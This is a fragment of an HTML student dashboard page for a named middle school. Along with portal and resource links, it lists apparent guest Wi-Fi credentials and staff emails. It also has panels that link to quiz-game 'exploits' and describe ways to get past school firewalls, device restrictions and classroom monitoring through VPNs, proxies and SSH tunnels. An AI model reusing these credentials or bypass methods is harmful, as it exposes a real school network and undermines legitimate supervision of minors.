      <button id="notesBtn">📒 Notes</button>
      <button id="exportNotesBtn">💾 Export Notes</button>
      <button id="screenshotBtn">📸 Screenshot</button>
      <button id="toggleSectionsBtn">⬆️ Toggle Sections</button>
      <button id="fixIssuesBtn">🛠️ Fix Issues</button>
      <button id="fullScreenBtn">🖥️ Full Screen</button>
      <button id="zoomInBtn">➕ Zoom In</button>
      <button id="zoomOutBtn">➖ Zoom Out</button>
      <button id="restartBtn">🔄 Restart</button>
      <button id="panicBtn">🚨 Panic</button>
      <button id="themeToggle">🌙 Dark Mode</button>
      <button id="logoutBtn">🔓 Log Out</button>
    </div>

    <div id="announcementBar" class="announcement-bar">
      <span>🚨 Welcome to the Private Dashboard GUI V2.0.0! Stay tuned for massive updates and alerts. Check out the new settings panel and features! 🚨</span>
    </div>

    <div class="main-row" id="mainGrid">

      <div class="box">
        <h2>📅 Calendar</h2>
        <div class="calendar" id="calendar"></div>
      </div>

      <div class="box motivation-box" id="motivationBox">
        "Success is not final, failure is not fatal: It is the courage to continue that counts." – Winston Churchill
      </div>
    </div>

    <div id="updatesNotifications" style="display: flex; gap: 20px; justify-content: center; flex-wrap: wrap; margin-top: 20px;">
      <div class="box" style="flex: 1 1 300px; min-width: 300px;">
        <h2>🔄 Updates</h2>
        <div class="update-entry">Dashboard V2.0.0 Live: Massive Feature Expansion! (2025-08-23)</div>
        <div class="update-entry">New Reminder System and Settings Panel Deployed! (2025-08-23)</div>
        <div class="update-entry">Improved Login Security and Logging Systems! (2025-08-20)</div>
      </div>

      <div class="box" style="flex: 1 1 300px; min-width: 300px;">
        <h2>🔔 Recent Notifications</h2>
        <ul id="notificationList" style="list-style-type: none; padding: 0;">
          <li>Welcome to the enhanced Private System!</li>
        </ul>
      </div>
    </div>

    <div class="utility-buttons-row" style="flex-wrap: wrap; margin-top: 30px;">
      <button data-panel-id="wifiPanel">📡 School WiFi Info</button>
      <button data-panel-id="ipadPanel">📱 School iPad Restrict</button>
      <button data-panel-id="handbookPanel">📘 Student Handbooks</button>
      <button data-panel-id="mapPanel">🏫 School Building Map</button>
      <button data-panel-id="studentWebsitesPanel">🌐 Student Websites</button>
      <button data-panel-id="teacherWebsitesPanel">👩‍🏫 Teacher Websites</button>
      <button data-panel-id="phoneDirectoryPanel">📞 Phone Directory</button>
      <button data-panel-id="cameraPanel">📷 School Camera Info</button>
      <button data-panel-id="schoolInfoPanel">🏫 School Info</button>
      <button data-panel-id="exploitPanel">🧨 Exploiting Tools</button>
      <button data-panel-id="bypassPanel">🚪 Bypassing Tools</button>
      <button data-panel-id="vpnPanel">🔐 VPN Websites</button>
      <button data-panel-id="gamingPanel">🎮 Gaming Websites</button>
      <button data-panel-id="musicPanel">🎵 Music Websites</button>
      <button data-panel-id="keyboardPanel">🎹 Keyboard Tricks</button>
      <!-- NEW BUTTONS ADDED HERE -->
      <button data-panel-id="messagingPanel">💬 Chat / Messaging</button>
      <button data-panel-id="fileStoragePanel">🗄️ File Storage</button>
      <button data-panel-id="newsFeedPanel">📰 School News Feed</button>
      <button data-panel-id="gradesViewerPanel">💯 Grades Viewer</button>
      <button data-panel-id="classSchedulePanel">🗓️ Class Schedule</button>
      <button data-panel-id="calculatorPanel">🧮 Calculator Tool</button>
      <button data-panel-id="remindersPanel">⏰ Reminder System</button>
      <button data-panel-id="resourceLibraryPanel">📚 Resource Library</button>
      <button data-panel-id="aiAssistantPanel">🧠 AI Assistant (Beta)</button>
      <button data-panel-id="faqPanel">❓ FAQ / Help</button>
      <button data-panel-id="passwordGeneratorPanel">🔑 Password Generator</button>
      <button data-panel-id="unitConverterPanel">📏 Unit Converter</button>
      <button data-panel-id="settingsPanel">⚙️ Settings</button> <!-- Settings Button -->
    </div>

    <!-- Information Panels Container -->
    <div id="infoPanelsContainer" style="margin-top: 20px;">
      <!-- WiFi Panel -->
      <div id="wifiPanel" class="info-panel">
        <h2>📡 School WiFi Information</h2>
        <div class="wifi-grid">
          <div>Network Name</div>
          <div>Wifi Level</div>
          <div>Security Type</div>
          <div>Encryption</div>
          <div>Hidden?</div>
          <div>Monitored?</div>
          <div>Username</div>
          <div>Password</div>
        </div>

        <div class="wifi-entry">
          <div>Middletown_Core</div>
          <div>High</div>
          <div>WPA3 Enterprise</div>
          <div>High</div>
          <div>No</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
        </div>

        <div class="wifi-entry">
          <div>Mtown_Core</div>
          <div>High</div>
          <div>WPA3 Enterprise</div>
          <div>High</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
          <div>Unknown</div>
        </div>

        <div class="wifi-entry">
          <div>Mtown Guest</div>
          <div>Medium</div>
          <div>WPA3 Enterprise</div>
          <div>Medium</div>
          <div>No</div>
          <div>Rare</div>
          <div>msguest</div>
          <div>M@ms2021#</div>
        </div>

        <div class="wifi-entry">
          <div>Radius Test</div>
          <div>Low</div>
          <div>WPA3 Enterprise</div>
          <div>Low</div>
          <div>No</div>
          <div>Rarely</div>
          <div>msguest</div>
          <div>M@ms2021#</div>
        </div>
      </div>

      <!-- iPad Panel -->
      <div id="ipadPanel" class="info-panel">
        <h2>📱 School iPad Restrictions</h2>
        <div class="ipad-options">
          <button onclick="dashboard.showIpadContent('restrictions')">Restrictions</button>
          <button onclick="dashboard.showIpadContent('bypasses')">Bypasses</button>
        </div>

        <div id="ipadRestrictions" class="ipad-content">
          <p>Restrictions information is currently under review for the 2025-2026 academic year. Common restrictions include:</p>
          <ul>
              <li>App Store purchasing/downloading disabled.</li>
              <li>Certain websites blocked via content filters.</li>
              <li>Camera access limited during school hours.</li>
              <li>System settings locked to prevent changes.</li>
              <li>Gaming and social media applications blacklisted.</li>
          </ul>
        </div>

        <div id="ipadBypasses" class="ipad-content">
          <p>Effective bypasses are being constantly researched and updated.</p>
          <p>Please note: Attempting unauthorized bypasses may lead to disciplinary action. Always proceed with caution.</p>
          <div class="info-text">
            <h4>Common Bypass Vectors (Use with caution):</h4>
            <ul>
                <li>Guest Mode/Safari Private Browsing loopholes (often patched quickly).</li>
                <li>VPN clients that evade network-level filtering.</li>
                <li>Utilizing specific third-party applications for tunneling.</li>
                <li>Device-specific configuration profile exploits (highly technical).</li>
            </ul>
            <p>For more detailed, up-to-date methods, consult the 'Bypassing Tools' section in the main dashboard.</p>
          </div>
        </div>
      </div>

      <!-- Handbook Panel -->
      <div id="handbookPanel" class="info-panel">
        <h2>📘 Student Handbooks Information</h2>
        <div class="handbook-buttons">
          <a href="https://cdnsm5-ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Elementary%20Handbook.pdf" target="_blank">Elementary Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Secondary%20Student%20Handbook.pdf" target="_blank">Secondary Student Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/District%20Handbook%20copy.pdf" target="_blank">District Handbook</a>
          <a href="https://middletown.ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025B%20RA%20Academy%20Handbook%20copy.pdf" target="_blank">RA Academy Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/MASD%202024-2025%20Virtual%20Learning%20Plan%20RSVD%20DEC2024.pdf" target="_blank">Virtual Learning Plan (2024-2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/2024-2025%20Dress%20Code.docx.pdf" target="_blank">Dress Code (2024-2025)</a>
        </div>
      </div>

      <!-- Map Panel -->
      <div id="mapPanel" class="info-panel">
        <h2>🏫 School Building Map Information</h2>
        <p>Building Map Display</p>
        <div class="coming-soon">
          Interactive Building Map Coming Soon - ETA Q4 2025. Will include floor plans, emergency exits, and key locations.
        </div>
      </div>

      <!-- Student Websites Panel -->
      <div id="studentWebsitesPanel" class="info-panel">
        <h2>🌐 Student Website's Information</h2>
        <div class="links-list">
          <a href="https://www.raiderweb.org" target="_blank">RaiderWeb</a>
          <a href="https://middletownsd.instructure.com/login" target="_blank">Canvas Login</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever Login</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
          <a href="https://www.raiderweb.org/student_services/hazing_reporting" target="_blank">Hazing Reporting</a>
          <a href="https://www.youtube.com/user/MAHSAnnouncements?app=desktop" target="_blank">MAHS Announcements</a>
          <a href="https://id.naviance.com" target="_blank">Naviance</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
          <a href="https://powerschool.raiderweb.org/public/" target="_blank">PowerSchool</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
          <a href="https://www.safe2saypa.org" target="_blank">Safe2Say</a>
          <a href="https://mail.google.com/mail/" target="_blank">Gmail</a>
          <a href="https://www.balfour.com/pennsylvania/middletown/middletown-area-high-school" target="_blank">Balfour</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt!</a>
          <a href="https://studentvue.middletown.org" target="_blank">StudentVUE (Grades)</a>
          <a href="https://zoom.us/join" target="_blank">Zoom Client</a>
          <a href="https://discord.com" target="_blank">Discord (Educational)</a>
          <a href="https://outlook.office365.com" target="_blank">Outlook Web Access</a>
        </div>
      </div>

      <!-- Teacher Websites Panel -->
      <div id="teacherWebsitesPanel" class="info-panel">
        <h2>👩‍🏫 Teacher Websites Information</h2>
        <div class="links-list">
          <a href="https://alo.acadiencelearning.org/login" target="_blank">Acadience Learning</a>
          <a href="https://app.aimswebplus.com/#/login" target="_blank">AIMSweb Plus</a>
          <a href="https://ep1.erplinq.com/MIDDLETOWN/" target="_blank">ERP Linq</a>
          <a href="https://sso.barracuda.com/u/login/identifier?state=hKFo2SBFYnNBRjVRYmczc2t0ZjlSNmwxel9GT25LZ2o3QzVDV6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIDQ1U0hHOGVubzF0eE10WlhiSkRZRnNQSmJqY1dwcnFlo2NpZNkgQk1yY2JuRWdkS3BkSjZRWGVjN0hiRHdlTkpMUW1MSUk" target="_blank">Barracuda</a>
          <a href="https://shop.buyguernsey.com/thmBootstrapHome.aspx" target="_blank">Buy Guernsey</a>
          <a href="https://middletownsd.instructure.com/login/ldap" target="_blank">Canvas (Teacher)</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever (Teacher)</a>
          <a href="https://www.discoveryeducation.com" target="_blank">Discovery Education</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge (Teacher)</a>
          <a href="https://raiderweb.gofmx.com/login" target="_blank">FMX</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
          <a href="https://login.frontlineeducation.com/login?signin=d0e98b785fd46dad06ce5509e61ef781&productId=ABSMGMT&clientId=ABSMGMT#/login" target="_blank">Frontline</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt! (Teacher)</a>
          <a href="https://id.naviance.com" target="_blank">Naviance</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
          <a href="https://paetep.edulinksolutions.com/login" target="_blank">PA eTEP</a>
          <a href="https://powerschool.raiderweb.org/teachers/pw.html" target="_blank">PowerSchool (Teacher)</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
          <a href="https://go.schoolmessenger.com/#/home" target="_blank">SchoolMessenger</a>
          <a href="https://www.pdesas.org/standard/" target="_blank">PDE SAS</a>
          <a href="https://www.pbisapps.org" target="_blank">PBIS Apps</a>
          <a href="https://masd.happyfox.com/home/" target="_blank">HappyFox</a>
          <a href="https://middletownasd-pa.safeschools.com/login" target="_blank">SafeSchools</a>
          <a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=2318564a-0ba1-6e05-dc95-01e3d532fa2a&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&nonce=637946967978129696.e952fd14-38f0-4c99-9385-0e633dcd181b&state=DYu5EYAwDMAcOMYxiePgZxzI01KyPi6kU6MEAHuwBamEQIXVm7ioq1H1qHP6VdeghmyrYOvu6GwXlinMow8yelK8R36_O_8" target="_blank">Office 365</a>
        </div>
      </div>

      <!-- Phone Directory Panel -->
      <div id="phoneDirectoryPanel" class="info-panel">
        <h2>📞 School Phone Directory Information</h2>
        <div class="info-text">
          <p>Please note: Direct access to individual teacher phone numbers is restricted. You can reach staff via their school email addresses or by calling the main office at 717-930-0739.</p>
          <div class="coming-soon">
            Enhanced Directory Lookup Coming Soon - Expected Q1 2026. Will include departmental contacts and extended administrative staff details.
          </div>
        </div>
      </div>

      <!-- Camera Panel -->
      <div id="cameraPanel" class="info-panel">
        <h2>📷 School Camera Information</h2>
        <div class="coming-soon">
          School Camera System Overview Update Coming Soon - ETA Late 2025. This section will detail general camera locations (e.g., hallways, entry points) and policy. No live feeds will be provided.
        </div>
      </div>

      <!-- School Info Panel -->
      <div id="schoolInfoPanel" class="info-panel">
        <h2>🏫 School Information</h2>
        <div class="school-info-grid">
          <div class="school-info-item">
            <div class="school-info-label">School Name:</div>
            <div>Middletown Area Middle School</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Address:</div>
            <div>215 Oberlin Road Middletown, PA 17057</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Fax:</div>
            <div>717-944-0591</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Principal:</div>
            <div>Dr. Shannon L. Wevodau</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Email:</div>
            <div>swevodau@raiderweb.org</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal:</div>
            <div>Mr. Michael DeFilippo</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Email:</div>
            <div>mdefilippo@raiderweb.org</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Nurse:</div>
            <div>Mrs. Elizabeth Smith</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Guidance Counselor:</div>
            <div>Mr. David Johnson</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Athletic Director:</div>
            <div>Mr. Robert Davis</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">District Superintendent:</div>
            <div>Dr. Mary Jane Doe</div>
          </div>
        </div>
        <div class="info-text" style="margin-top: 20px;">
            <h3>Academic Information</h3>
            <p><strong>School Hours:</strong> 7:45 AM - 2:30 PM (M-F)</p>
            <p><strong>Early Dismissal:</strong> 11:30 AM (Check district calendar)</p>
            <p><strong>Delayed Opening:</strong> 9:45 AM</p>
            <p><strong>Grade Levels:</strong> 6th, 7th, 8th Grade</p>
            <p><strong>Total Students:</strong> Approx. 950 students</p>
            <h3>Mission Statement</h3>
            <p>The Middletown Area School District provides all students with a comprehensive, rigorous education in a safe and supportive learning environment, preparing them for success in college, career, and life.</p>
        </div>
      </div>

      <!-- Exploit Panel -->
      <div id="exploitPanel" class="info-panel">
        <h2>🧨 Exploiting Tools</h2>
        <div class="exploit-buttons">
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Blooket Exploit</a>
          <a href="https://sites.google.com/view/tools-2/kahoot-exploit" target="_blank">Kahoot Exploit</a>
          <a href="https://sites.google.com/view/tools-2/gimkit-exploit" target="_blank">Gimkit Exploit</a>
          <a href="https://sites.google.com/view/tools-2/quizlet-exploit" target="_blank">Quizlet Exploit</a>
          <a href="https://sites.google.com/view/tools-2/quizzes-exploit" target="_blank">Quizzes Exploit</a>
          <a href="https://sites.google.com/view/tools-2/quills-exploit" target="_blank">Quills Exploit</a>
          <a href="https://sites.google.com/view/tools-2/edpuzzle-exploit" target="_blank">Edpuzzle Exploit</a>
          <a href="https://sites.google.com/view/tools-2/nearpod-exploit" target="_blank">Nearpod Exploit</a>
          <a href="https://sites.google.com/view/tools-2/coolmathgames-bypass" target="_blank">CoolmathGames Unlocker</a>
          <a href="https://sites.google.com/view/tools-2/texting-unblocker" target="_blank">Texting Unblocker</a>
        </div>
        <div class="info-text" style="margin-top: 20px;">
          <h3>Disclaimer:</h3>
          <p>These tools are provided for educational purposes only. Unauthorized use on school networks or devices may violate school policy and result in disciplinary actions. Use responsibly and at your own risk.</p>
          <p>Many of these links redirect to common "unblocked games" sites or instructional pages for circumventing digital restrictions. Effectiveness varies and school systems frequently patch vulnerabilities.</p>
        </div>
      </div>

      <!-- Bypass Panel -->
      <div id="bypassPanel" class="info-panel">
        <h2>🚪 Bypassing Tools</h2>
        <div class="bypass-buttons">
          <button onclick="dashboard.showBypassContent('bathroom')">Bathroom Bypass</button>
          <button onclick="dashboard.showBypassContent('wifi')">Wifi Bypass</button>
          <button onclick="dashboard.showBypassContent('monitoring')">Teacher Monitoring Bypass</button>
          <button onclick="dashboard.showBypassContent('firewall')">Firewall Bypass</button>
          <button onclick="dashboard.showBypassContent('timeLock')">Time Lock Bypass</button>
          <button onclick="dashboard.showBypassContent('appBlock')">App Blocker Bypass</button>
        </div>

        <div id="bathroomBypass" class="bypass-content">
          <h3>Bathroom Bypass Strategy (Social Engineering)</h3>
          <p>COMING SOON: This section will offer tips and strategies for effective bathroom break timing and common hall monitor patterns. Not a digital bypass.</p>
          <div class="coming-soon">Content under development.</div>
        </div>

        <div id="wifiBypass" class="bypass-content">
          <h3>WiFi Bypass</h3>
          <p>Refer to the <button class="small-inline-btn" onclick="dashboard.togglePanel('wifiPanel'); dashboard.showNotification('Navigating to School WiFi Info panel...');">School WiFi Information</button> panel for guest network credentials and other potential vulnerabilities.</p>
          <p>Using a VPN is another common method to bypass network filtering once connected to a Wi-Fi network.</p>
        </div>

        <div id="monitoringBypass" class="bypass-content">
          <h3>Teacher Monitoring Bypass</h3>
          <p>COMING SOON: Strategies to avoid detection by classroom monitoring software (e.g., GoGuardian, Gaggle, etc.). This may include techniques like using virtual desktops, privacy screens, or knowledge of monitoring software's limitations.</p>
          <div class="coming-soon">Content under development.</div>
        </div>

        <div id="firewallBypass" class="bypass-content">
          <h3>Firewall Bypass Techniques</h3>
          <p>Utilizing a trusted VPN service, encrypted proxy websites, or SSH tunneling can sometimes circumvent basic firewall rules. Advanced techniques involve changing DNS servers or leveraging certain port forwarding configurations. Always verify legality and safety before attempting.</p>
          <p>Consult the <button class="small-inline-btn" onclick="dashboard.togglePanel('vpnPanel'); dashboard.showNotification('Navigating to VPN Websites panel...');">VPN Websites</button> panel for resources.</p>
        </div>

        <div id="timeLockBypass" class="bypass-content">
          <h3>Time Lock Bypass (Device)</h3>
          <p>COMING SOON: Methods for circumventing time-based restrictions on school-issued devices, such as screen time limits or app usage schedules. This often relies on exploiting system clock vulnerabilities or administrator access. Highly dependent on device model and MDM solution.</p>
          <div class="coming-soon">Content under development.</div>
        </div>

        <div id="appBlockBypass" class="bypass-content">
          <h3>Application Blocker Bypass</h3>
          <p>COMING SOON: Techniques for bypassing restrictions on specific applications or app stores. This can range from installing unapproved apps via sideloading (if allowed) to using web-based alternatives or sandbox environments.</p>
          <div class="coming-soon">Content under development.</div>
        </div>
      </div>

      <!-- VPN Panel -->
      <div id="vpnPanel" class="info-panel">
        <h2>🔐 VPN Websites</h2>
        <div class="links-list">
          <a href="https://protonvpn.com/" target="_blank">ProtonVPN Free</a>
          <a href="https://windscribe.com/" target="_blank">Windscribe (Limited Free)</a>
          <a href="https://www.tunnelbear.com/" target="_blank">TunnelBear (Limited Free)</a>
          <a href="https://privatize.tech/proxy" target="_blank">Free Proxy Sites (various)</a>
          <a href="https://hide.me/" target="_blank">Hide.me VPN (Free Tier)</a>
          <a href="https://hotspotshield.com/free-vpn/" target="_blank">Hotspot Shield Free</a>
          <a href="https://www.urban-vpn.com/" target="_blank">Urban VPN (Free)</a>
          <a href="https://cyberghostvpn.com/" target="_blank">CyberGhost (Trial)</a>
          <a href="https://www.surfshark.com/" target="_blank">Surfshark (Trial)</a>
          <a href="https://www.nordvpn.com/" target="_blank">NordVPN (Trial)</a>
          <a href="https://opera.com/browser/vpn" target="_blank">Opera Browser (Built-in VPN)</a>
          <a href="https://cloudflarewarp.com/" target="_blank">Cloudflare Warp (DNS/VPN Hybrid)</a>
        </div>
        <div class="info-text" style="margin-top: 20px;">
          <h3>Warning:</h3>
          <p>Using VPNs on school networks might violate Acceptable Use Policies. Some networks have advanced VPN detection. Free VPNs may have data limits, ads, or slower speeds. Exercise caution and verify the reputation of any service.</p>
        </div>
      </div>

      <!-- Gaming Panel -->
      <div id="gamingPanel" class="info-panel">
        <h2>🎮 Gaming Websites</h2>
        <div class="links-list">
          <a href="https://poki.com" target="_blank">Poki.com (Variety)</a>
          <a href="https://scratch.mit.edu/explore/games" target="_blank">Scratch Games (User-created)</a>
          <a href="https://miniclip.com" target="_blank">MiniClip (Browser Games)</a>
          <a href="https://sites.google.com/view/unblocked-games-world/" target="_blank">Unblocked Games World</a>
          <a href="https://sites.google.com/view/3kh0/" target="_blank">3KH0 (Unblocked)</a>
          <a href="https://sites.google.com/site/gseries/" target="_blank">G Series (Unblocked)</a>
          <a href="https://slope-game.io/" target="_blank">Slope Game</a>
          <a href="https://shellshock.io/" target="_blank">Shell Shockers (FPS)</a>
          <a href="https://krunker.io/" target="_blank">Krunker.io (FPS)</a>
          <a href="https://skribbl.io/" target="_blank">Skribbl.io (Drawing Game)</a>
        </div>
        <div class="info-text" style="margin-top: 20px;">
          <p>Always be aware of network bandwidth usage when playing online games, especially during school hours. High usage might flag network administrators.</p>
        </div>
      </div>

      <!-- Music Panel -->
      <div id="musicPanel" class="info-panel">
        <h2>🎵 Music Websites</h2>
        <div class="links-list">
          <a href="https://listen.moe" target="_blank">Listen.moe (Anime Music Radio)</a>
          <a href="https://music.youtube.com/" target="_blank">YouTube Music</a>
          <a href="https://soundcloud.com/" target="_blank">SoundCloud</a>
          <a href="https://music.apple.com/" target="_blank">Apple Music (Requires subscription)</a>
          <a href="https://tidal.com/" target="_blank">Tidal (Hi-fi streaming, requires subscription)</a>
          <a href="https://audiomack.com/" target="_blank">Audiomack (Free mixtapes, new music)</a>
          <a href="https://reverb.link/" target="_blank">Reverb Nation (Independent artists)</a>
          <a href="https://open.spotify.com/" target="_blank">Spotify Web Player</a>
          <a href="https://radio.garden/" target="_blank">Radio Garden (Global Radio)</a>
          <a href="https://www.pandora.com/" target="_blank">Pandora (Personalized Radio)</a>
          <a href="https://www.8tracks.com/" target="_blank">8tracks (Curated playlists)</a>
          <a href="https://chillhop.com/" target="_blank">Chillhop Radio (Lo-fi/Instrumental)</a>
        </div>
        <div class="info-text" style="margin-top: 20px;">
          <p>Consider using headphones and keep volume low to avoid disrupting class. Some school networks may block music streaming services.</p>
        </div>
      </div>

      <!-- Keyboard Panel -->
      <div id="keyboardPanel" class="info-panel">
        <h2>🎹 Keyboard Tricks</h2>
        <div class="info-text">
          <p>System Shortcuts:
• Access Spotlight Search: Press Command (⌘) + Space bar.
• Return to the Home screen: Press Command (⌘) + H.
• Show the Dock: Press Command (⌘) + Option (⌥) + D.
• Show the App Library: Press Shift (⇧) + Globe + A.
• Open Quick Note: Press Globe + Q.
• Open Siri: Press Globe + S.
• Open Control Center: Press Globe + C.
• Open Notification Center: Press Globe + N.
• Show all windows: Press Globe + Down Arrow.
• Open the App Switcher: Press Globe + Up Arrow.
Multitasking Shortcuts:
• Switch to the last active app: Press Command (⌘) + Tab.
• View all active apps: Press and hold Command (⌘) + Tab.
• Open Split View: Press Control (⌃) + Globe + Left Arrow to move an app to the left, or Control (⌃) + Globe + Right Arrow to move it to the right.
• Switch the position of apps in Split View: Press Control (⌃) + Globe + Left or Right Arrow.
• Open Slide Over: Press Globe + Backslash.
• Move the Slide Over window: Press Option (⌥) + Globe + Left or Right Arrow.
Safari and App-Specific Shortcuts:
• Take a full-screen screenshot: Press Command (⌘) + Shift + 3.
• Take a screenshot and enter markup immediately: Press Command (⌘) + Shift + 4.
• Open a new private tab: Press Command (⌘) + Shift + N.
• Open a new tab: Press Command (⌘) + T or Command (⌘) + N.
• Close the current tab: Press Command (⌘) + W.
• Close all tabs in Tab Grid: Press Shift + Command (⌘) + W.
• Go to the next tab: Press Option (⌥) + Command (⌘) + Right Arrow, or Control (⌃) + Tab, or Command (⌘) + }.
• Go to the previous tab: Press Option (⌥) + Command (⌘) + Left Arrow, or Shift + Control (⌃) + Tab, or Command (⌘) + {.
• Reopen the last closed tab: Press Shift + Command (⌘) + T.
• Go to a specific tab (1-8): Press Command (⌘) + (1-8).
• Go to the last tab: Press Command (⌘) + 9.
• Open the Tab Grid: Press Shift + Command (⌘) + .
• Open a new Incognito tab: Press Shift + Command (⌘) + N.
• Open a new Incognito window: Press Option (⌥) + Shift + Command (⌘) + N.
• Open a new window: Press Option (⌥) + Command (⌘) + N.
General Navigation and Text Editing:
• Navigate between elements in an app (like fields, lists, buttons): Press Tab.
• Select all text: Press Command (⌘) + A.
• Copy selected text: Press Command (⌘) + C.
• Cut selected text: Press Command (⌘) + X.
• Paste copied text: Press Command (⌘) + V.
• Undo the last action: Press Command (⌘) + Z.
• Redo the last undone action: Press Command (⌘) + Shift + Z.
• Jump to the top of a page: Press Command (⌘) + Up Arrow.
• Jump to the bottom of a page: Press Command (⌘) + Down Arrow.
• Highlight text one character at a time: Press Shift + Left or Right Arrow.
To view all available shortcuts for the specific app you are using, press and hold the Command (⌘) key. For a complete list of system-wide shortcuts, press and hold the Globe key on a compatible keyboard.</p>
        </div>
      </div>

      <!-- NEW PANELS START HERE -->

      <!-- Messaging Panel -->
      <div id="messagingPanel" class="info-panel">
        <h2>💬 Chat / Messaging (Internal System)</h2>
        <div class="info-text">
          <p><strong>This is a mock internal messaging system.</strong> No actual messages are sent or received. Functionality under development for secure, internal school communications.</p>
          <div style="background: #3a3a3a; padding: 15px; border-radius: 8px; margin-top: 15px; max-height: 250px; overflow-y: auto;">
            <p><strong>[User1]:</strong> Hey, anyone free for study group after school?</p>
            <p><strong>[Admin]:</strong> Reminder: All school communication should adhere to the AUP.</p>
            <p><strong>[User2]:</strong> Yeah, I'm free at 3:15. Library?</p>
            <p><strong>[You]:</strong> Sounds good! I'll be there.</p>
          </div>
          <div style="display: flex; gap: 10px; margin-top: 15px;">
            <input type="text" placeholder="Type your message here..." style="flex-grow: 1;">
            <button>Send</button>
          </div>
        </div>
      </div>

      <!-- File Storage Panel -->
      <div id="fileStoragePanel" class="info-panel">
        <h2>🗄️ File Storage (Cloud Access)</h2>
        <div class="links-list">
          <a href="https://drive.google.com" target="_blank">Google Drive</a>
          <a href="https://onedrive.live.com" target="_blank">OneDrive</a>
          <a href="https://www.dropbox.com" target="_blank">Dropbox</a>
          <a href="https://iclouddrive.icloud.com" target="_blank">iCloud Drive</a>
          <a href="https://filebrowser.myschool.org" target="_blank">School Network Drive (Mock)</a>
        </div>
        <div class="info-text">
          <p>Access your cloud storage or mock school network files here. Always ensure files are school-appropriate and do not violate any policies.</p>
        </div>
        <div class="coming-soon" style="margin-top: 15px;">
          Integrated File Preview & Upload Features Coming Soon - Expected Early 2026.
        </div>
      </div>

      <!-- School News Feed Panel -->
      <div id="newsFeedPanel" class="info-panel">
        <h2>📰 School News Feed</h2>
        <div class="info-text">
          <h3>Latest Headlines:</h3>
          <div class="update-entry"><strong>2025-08-23:</strong> School Board Approves New Tech Initiatives.</div>
          <div class="update-entry"><strong>2025-08-22:</strong> Robotics Club Wins Regional Competition!</div>
          <div class="update-entry"><strong>2025-08-20:</strong> Parent-Teacher Conference Sign-ups Now Open.</div>
          <div class="update-entry"><strong>2025-08-19:</strong> Fall Sports Tryouts Announced.</div>
        </div>
        <div class="links-list" style="margin-top: 15px;">
          <a href="https://www.raiderweb.org/news" target="_blank">Full News Archive (RaiderWeb)</a>
        </div>
      </div>

